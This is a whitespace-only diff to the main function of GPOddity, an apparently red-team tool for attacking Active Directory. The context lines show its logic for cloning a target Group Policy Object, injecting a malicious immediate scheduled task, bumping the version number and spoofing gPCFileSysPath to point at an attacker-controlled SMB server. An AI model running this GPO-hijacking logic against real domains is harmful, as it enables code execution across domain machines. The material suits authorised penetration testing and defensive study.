@@ -51,7 +51,7 @@ def main(
         verbose: Annotated[bool, typer.Option("--verbose", help="[Optional] Enable verbose output", rich_help_panel="General options")] = False,
         smb_mode: Annotated[SMBModes, typer.Option("--smb-mode", help="[Optional] 'Embedded' SMB server will host an SMB server on this machine. 'Forwarded' will forward SMB traffic to a fake Domain Controller (requires a machine account associated with a DNS record pointing to the attacker machine. Generated GPT should be uploaded on the fake DC). 'None' will not host any SMB server (generated GPT should be uploaded on a writable SMB share in the domain)", rich_help_panel="SMB server options")] = "embedded",
         empty_gpo: Annotated[bool, typer.Option("--empty-gpo", help="[Optional] By default, GPOddity will clone the target GPO and add a malicious immediate task. If this flag is specified, an empty GPO will be used instead of a clone of the legitimate one (can be useful for some edge cases in which immediate tasks will not integrate well with existing GPOs)", rich_help_panel="SMB server options")] = False,
-        
+
         attacker_ip: Annotated[str, typer.Option("--attacker-ip", help="[Optional] The IP of the attacker machine in the internal network (required for smb-mode 'forwarded')", rich_help_panel="SMB server options")] = '',
         forwarded_ip: Annotated[str, typer.Option("--forwarded-ip", help="[Optional] The IP of the fake DC to which SMB traffic will be forwarded (required for smb-mode 'forwarded')", rich_help_panel="SMB server options")] = '',
         just_clean: Annotated[bool, typer.Option("--just-clean", help="[Optional] Only perform cleaning action from the values specified in the file of the --clean-file flag. May be useful to clean up in case of incomplete exploitation or ungraceful exit", rich_help_panel="General options")] = False,
@@ -68,7 +68,7 @@ def main(
     ### ============================= ###
     ### In case we just want to clean ###
     ### ============================= ###
-    
+
     if just_clean is True:
         if clean_file is None:
             logger.error(f"[!] You provided the --just-clean flag without specifying the --clean-file argument.")
@@ -76,7 +76,7 @@ def main(
         if username is None and (password is None and hash is None):
             logger.error(f"[!] To perform cleaning, please provide valid credentials for a user having the necessary rights to update the GPO AD object.")
             return
-    
+
         logger.warning(f"\n{bcolors.BOLD}=== Cleaning and restoring previous GPC attribute values ==={bcolors.ENDC}\n")
         logger.warning("[*] Initiating LDAP connection")
         server = Server(f'ldaps://{dc_ip}:636', port = 636, use_ssl = True) if ldaps is True else Server(f'ldap://{dc_ip}:389', port = 389, use_ssl = False)
@@ -110,14 +110,14 @@ def main(
         confirmation = typer.prompt("[!] You are trying to target a User Group Policy Object while running the embedded SMB server. This will probably not work. Are you sure you want to continue? [yes/no] ")
         if confirmation != 'yes':
             return
-    
+
     if machine_name is None:
         machine_name = username
         machine_pass = password
         machine_hash = hash
-    
 
-    
+
+
     ### =========================================================================== ###
     ### Generating the malicious Group Policy Template and storing it in OUTPUT_DIR ###
     ### =========================================================================== ###
@@ -154,7 +154,7 @@ def main(
         sys.exit(1)
     logger.warning(f"{bcolors.OKGREEN}[+] Successfully injected malicious scheduled task{bcolors.ENDC}")
 
-    
+
     # Update spoofed GPO version number
     try:
         logger.warning("[*] Initiating LDAP connection")
@@ -170,14 +170,14 @@ def main(
     except:
         logger.critical(f"[!] Failed update downloaded GPO version number (there might be something wrong with the provided LDAP credentials?). Exiting...", exc_info=True)
         sys.exit(1)
-    
+
 
     ### ================================================================== ###
     ### Spoofing the location of the Group Policy Template to rogue server ###
     ### ================================================================== ###
 
     logger.warning(f"\n{bcolors.BOLD}=== SPOOFING GROUP POLICY TEMPLATE LOCATION THROUGH gPCFileSysPath ==={bcolors.ENDC}\n")
-    
+
     # Prepare to save value to clean
     save_file_name = init_save_file(gpo_id)
     logger.info(f"[*] The save file for current exploit run is {save_file_name}")
@@ -211,7 +211,7 @@ def main(
     save_attribute_value("versionNumber", versionNumber, save_file_name)
     logger.warning(f"{bcolors.OKGREEN}[+] Successfully updated GPC versionNumber attribute{bcolors.ENDC}")
 
-    
+
     # Update extensionName
     logger.warning(f"[*] Updating the extensionName attribute of the GPC")
     try:
@@ -227,7 +227,7 @@ def main(
         logger.critical(f"[!] Failed to modify the extensionName atribute of the target GPO. Cleaning...")
         clean(ldap_session, gpo_dn, save_file_name)
         logger.critical("[!] Exiting...")
-        sys.exit(1) 
+        sys.exit(1)
     save_attribute_value(attribute_name, extensionName, save_file_name)
     logger.warning(f"{bcolors.OKGREEN}[+] Successfully updated GPC extensionName attribute{bcolors.ENDC}")
 
@@ -304,6 +304,6 @@ def main(
 def entrypoint():
     typer.run(main)
 
-    
+
 if __name__ == "__main__":
     typer.run(main)
